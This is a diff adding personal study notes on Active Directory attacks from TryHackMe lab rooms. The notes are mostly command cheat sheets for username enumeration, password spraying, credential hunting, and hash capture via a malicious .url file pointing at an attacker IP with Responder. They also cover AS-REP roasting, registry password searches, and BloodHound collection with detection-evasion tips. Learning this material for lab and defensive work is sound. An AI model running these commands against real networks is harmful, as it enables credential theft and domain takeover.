@@ -481,3 +481,436 @@ smbclient.py domain/Administrator@HOSTNAME -k -no-pass
 <br>
 
 
+# Intro to AD Breaching
+[LINK](https://tryhackme.com/room/introductiontoactivedirectorybreaching)
+
+
+**Breaching = getting first valid creds from zero**
+
+
+**Attack Surface**
+| Service | Port | Why Target |
+|---|---|---|
+| SMB | 445 | Password spraying, credential testing |
+| LDAP | 389/636 | Misconfigured devices leaking creds |
+| HTTP/S | 80/443 | Portals, GitLab, config pages with creds |
+| Kerberos | 88 | Username enumeration, AS-REP roasting |
+| DNS | 53 | Map infrastructure, find DCs |
+
+
+**Two Starting Positions**
+- **Unauthenticated** → enumerate, spray, coerce → get first creds
+- **Authenticated (low priv)** → skip to enumeration → find escalation paths
+
+
+**Why Even Low-Priv Creds Matter**
+Any domain user can query:
+- All users, groups, computers
+- GPOs, trust relationships
+- SPNs (→ Kerberoast)
+- ACLs (→ find misconfigs with BloodHound)
+
+<br>
+
+
+**OSINT Username Sources**
+- LinkedIn → `linkedin2username` tool
+- GitHub/GitLab → corporate emails in commits
+- Breach databases → reveal email/username format
+- "Meet the Team" pages, job listings
+
+**Common formats:** `first.last` / `flast` / `firstlast` / `first` / `last.first` / `first.l`
+
+
+**Username Enumeration — Kerbrute**
+```bash
+kerbrute userenum -d thm.loc --dc <DC_IP> usernames.txt -o valid_users.txt
+```
+- Abuses Kerberos pre-auth: `KDC_ERR_C_PRINCIPAL_UNKNOWN` = user doesn't exist
+- **No lockout triggered** but generates Event ID **4768** on DC
+
+
+**DNS Enumeration**
+```bash
+# Find Domain Controllers
+nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain> <DC_IP>
+
+# Find KDC
+nslookup -type=SRV _kerberos._tcp.<domain> <DC_IP>
+
+# Find mail servers
+nslookup -type=MX <domain> <DC_IP>
+```
+
+
+**Flow**
+```
+OSINT → username list → Kerbrute validate → confirmed users → spray/roast
+```
+
+<br>
+
+
+**Where to Hunt Credentials**
+
+**Git Repos**
+```bash
+# Manual search through commit history
+git log -p | grep -i "password\|secret\|token\|key"
+
+# Automated deep scan
+trufflehog git file:///path/to/repo
+```
+- Check: `.env`, `web.config`, `appsettings.json`, `config.php`
+- Check: CI/CD files → `Jenkinsfile`, `.gitlab-ci.yml`, `.github/workflows/`
+- **Deleted secrets still exist in commit history**
+
+**Jenkins** (default creds: `admin:admin`)
+```bash
+curl http://ci.target.loc/job/JOB_NAME/lastBuild/consoleText | grep -i "password\|secret\|token"
+```
+- Check: build console output, job `config.xml`, env variables, workspace files
+
+
+**Other Quick Wins**
+- Internal wikis/runbooks → default passwords
+- Network shares → `unattend.xml`, `bootstrap.ini`, `web.config`
+- LDAP anonymous bind → user enumeration without creds
+- SNMP default strings → device configs with creds
+
+
+<br>
+
+
+**Spray vs Brute-force**
+- **Brute-force** = many passwords → one account → triggers lockout
+- **Spray** = one password → many accounts → stays under lockout threshold
+
+
+**Before Spraying — Check Password Policy**
+```bash
+nxc smb <DC_IP> -u 'user' -p 'pass' --pass-pol
+```
+Rule: spray at most `lockout_threshold - 1` passwords per observation window
+
+
+**Spraying with NetExec**
+```bash
+# Clean up kerbrute output first
+grep "VALID USERNAME" valid_users.txt | awk '{print $NF}' | sed 's/@domain//' > clean_users.txt
+
+# Spray
+nxc smb <DC_IP> -u clean_users.txt -p 'Password123!' --continue-on-success
+
+# Add jitter for OPSEC
+nxc smb <DC_IP> -u clean_users.txt -p 'Password123!' --continue-on-success --jitter 2-5
+```
+
+
+**Output Codes**
+| Symbol | Meaning |
+|---|---|
+| `[+]` | Valid creds |
+| `[-] STATUS_LOGON_FAILURE` | Wrong password |
+| `[-] STATUS_ACCOUNT_DISABLED` | Exists, can't use |
+| `[-] STATUS_ACCOUNT_LOCKED_OUT` | **Stop spraying immediately** |
+| `(Pwn3d!)` | Local admin on target |
+
+
+**Other spray targets:** OWA, RDP, LDAP, WinRM, MSSQL — just swap `smb` in nxc
+
+<br>
+
+
+**Two Coercion Techniques**
+
+**1. LDAP Passback (Printers)**
+```bash
+# Setup listener
+nc -lvnp 3489
+
+# Then: admin panel → change LDAP server IP → your IP → Test Connection
+# Captures: plaintext DN + password in raw output
+```
+- Default creds: `admin:admin` (HP), `admin:` blank (Ricoh), `ADMIN:canon`
+- Works because devices use **plaintext LDAP port 389**
+- ATT&CK: `T1187`
+
+
+**2. File-Based Coercion (.url file)**
+```bash
+# Create malicious file
+cat > @Shortcut.url << 'EOF'
+[InternetShortcut]
+URL=http://anything.com
+IconFile=\\<YOUR_IP>\icons\icon.ico
+IconIndex=1
+EOF
+
+# Start Responder
+sudo responder -I tun0
+
+# Upload to writable share
+smbclient //TARGET/share -U 'domain\user%pass'
+smb: \> put @Shortcut.url
+```
+- `@` prefix → sorts to top → loads first when share opened
+- Windows auto-loads icon → triggers SMB auth → captures **NTLMv2 hash**
+- Crack with: `hashcat -m 5600 hash.txt rockyou.txt`
+
+
+**Critical Distinction**
+| Method | Gets you | Usable for |
+|---|---|---|
+| LDAP Passback | Plaintext password | Direct auth |
+| File Coercion | NTLMv2 hash | Crack offline only (NOT PtH) |
+
+
+**Advanced Coercion**
+- **PetitPotam, PrinterBug, DFSCoerce** → force DC to authenticate → combine with **relay attacks** → no cracking needed
+
+<br>
+
+
+**Secrets Management failures to look for**
+- No pre-commit hooks → secrets in git history
+- No secrets vault → creds in config files, CI logs
+- Secret "deleted" from latest commit → still in history
+
+
+**Password Policy weaknesses to exploit**
+- Min length < 14 → easier cracking
+- No banned password list → company+year patterns work
+- Org-wide default onboarding password → spray gold
+- Lockout threshold > 10 → more spray attempts safe
+
+
+**Device hardening failures**
+- Default admin creds → LDAP passback
+- Port 389 (plaintext) instead of 636 (LDAPS) → capture cleartext
+- Admin panel on general network → accessible without VLAN restriction
+- Over-privileged LDAP service account → big win if captured
+
+
+**File share failures**
+- Write access for regular users → drop `.url` file
+- No file integrity monitoring → `.url/.lnk` goes undetected
+- No SMB egress blocking → hash goes out to attacker
+
+
+**NTLM hardening failures**
+- NTLMv1 still enabled → faster cracking
+- No SMB signing → relay attacks work
+- Port 445 outbound not blocked → coercion works externally
+
+
+**Network failures**
+- No VLAN segmentation → printer/Jenkins accessible from user network
+- No MFA on internal services → one breached password = full access
+- Jenkins reachable org-wide → credential discovery easy
+
+
+<br>
+<br>
+
+# AD: Authenticated Enumeration
+[LINK](https://tryhackme.com/room/adauthenticatedenumeration)
+
+
+**AS-REP Roasting**
+- Target: accounts with `UF_DONT_REQUIRE_PREAUTH` flag set
+- **No credentials needed** — unauthenticated attack
+- KDC returns encrypted AS-REP blob without verifying identity → crack offline
+
+
+**Commands**
+
+**Linux (Impacket)**
+```bash
+GetNPUsers.py domain.loc/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
+```
+
+**Windows (Rubeus)**
+```bash
+Rubeus.exe asreproast
+```
+
+**Crack**
+```bash
+hashcat -m 18200 hashes.txt rockyou.txt
+```
+Hash starts with `$krb5asrep$23$`
+
+
+**Quick Comparison**
+| | AS-REP Roast | Kerberoast |
+|---|---|---|
+| Needs creds | No | Yes (any domain user) |
+| Target | Users w/ pre-auth disabled | Service accounts w/ SPN |
+| Hash mode | 18200 | 13100 |
+| Hash prefix | `$krb5asrep$23$` | `$krb5tgs$23$` |
+
+**Detection:** anomalous AS-REP requests on DC (Event ID 4768 with no pre-auth)
+
+<br>
+
+
+
+
+**Who am I?**
+```cmd
+whoami                          :: domain\user
+whoami /all                     :: SID, groups, privileges
+```
+
+**High-value privileges to spot:**
+| Privilege | Abuse |
+|---|---|
+| `SeImpersonatePrivilege` | Potato attacks → SYSTEM |
+| `SeBackupPrivilege` | Read SAM/SYSTEM hive |
+| `SeDebugPrivilege` | Dump LSASS → creds |
+| `SeRestorePrivilege` | Overwrite system files |
+
+
+**System Info**
+```cmd
+hostname
+systeminfo | findstr /B "Domain"
+set                             :: env vars (PowerShell: dir env:)
+```
+
+
+**Domain Enumeration**
+```cmd
+net user /domain                :: all domain users
+net user <user> /domain         :: user details
+net group /domain               :: all domain groups
+net group "Domain Admins" /domain
+net localgroup administrators   :: local admin members
+```
+
+
+**Logged-on Users**
+```cmd
+quser                           :: active sessions → target admins for token theft
+tasklist /V                     :: running processes
+net session                     :: SMB sessions (admin required)
+```
+
+
+**Service Accounts**
+```cmd
+wmic service get Name,StartName :: find domain accounts running services
+sc query state= all             :: all services
+sc qc <ServiceName>             :: service config + account
+```
+Look for `DOMAIN\username` in StartName → Kerberoast target
+
+
+**Registry Goldmines**
+```cmd
+:: Plaintext autologon creds
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+
+:: Installed apps → default creds
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+
+:: Search registry for passwords
+reg query HKLM /f "password" /t REG_SZ /s
+```
+
+
+**Scheduled Tasks**
+```cmd
+schtasks /query
+```
+
+
+<br>
+
+
+**BloodHound in 2 stages**
+1. **Collect** — run SharpHound/bloodhound-python → get ZIP
+2. **Analyze offline** — find attack paths without touching the network again
+
+
+**Collection Commands**
+
+**Windows (SharpHound)**
+```cmd
+.\SharpHound.exe --CollectionMethods All --Domain domain.loc --ExcludeDCs
+```
+
+**Linux (bloodhound-python)**
+```bash
+bloodhound-python -u user -p pass -d domain.loc -ns <DC_IP> -c All --zip
+```
+Supports: creds, NTLM hash, or Kerberos ticket
+
+
+**Key Node Relationships to check**
+- **Outbound object control** → what can this user do to others
+- **Inbound object control** → who has rights over this user
+- **Local admin privileges** → which machines can this user admin
+- **Member of** → group memberships → inherited rights
+
+
+**Key Built-in Queries**
+- Shortest path to Domain Admins
+- All Domain Admins
+- Kerberoastable users
+- AS-REP roastable users
+- Computers where Domain Users are local admin
+
+
+**OPSEC**
+- `--ExcludeDCs` → less noisy
+- `DCOnly` collection method → LDAP only, no computer enumeration
+- Run from non-domain machine with `runas /netonly`
+- SharpHound **will** trigger EDR/AV — plan accordingly
+
+<br>
+
+
+
+
+**ActiveDirectory Module**
+```powershell
+Import-Module ActiveDirectory
+
+Get-ADUser -Filter *
+Get-ADUser -Identity <user> -Properties LastLogonDate,MemberOf,Description,PwdLastSet
+Get-ADUser -Filter "Name -like '*admin*'"
+Get-ADGroup -Filter * | Select Name
+Get-ADGroupMember -Identity "Domain Admins"
+Get-ADComputer -Filter * | Select Name,OperatingSystem
+Get-ADDefaultDomainPasswordPolicy          # lockout threshold → spray planning
+```
+
+
+**PowerView (PowerSploit)**
+```powershell
+Import-Module .\PowerView.ps1
+
+Get-DomainUser                             # all users
+Get-DomainUser *admin*                     # filter by name
+Get-DomainUser -AdminCount                 # admin-privileged users
+Get-DomainUser -SPN                        # Kerberoast targets ← key
+Get-DomainGroup "*admin*"                  # groups with admin in name
+Get-DomainComputer                         # all computers + SPNs
+```
+
+
+**Why PowerView over net commands**
+- Richer output (last logon, description, SPN, group membership in one query)
+- Filterable and pipeable
+- `Get-DomainUser -SPN` directly surfaces Kerberoast targets
+- `Description` field often contains **plaintext passwords** left by admins
+
+
+**Quick Kerberoast target hunt**
+```powershell
+Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName
+```
+Then feed to `GetUserSPNs.py` or `Rubeus.exe kerberoast`
+
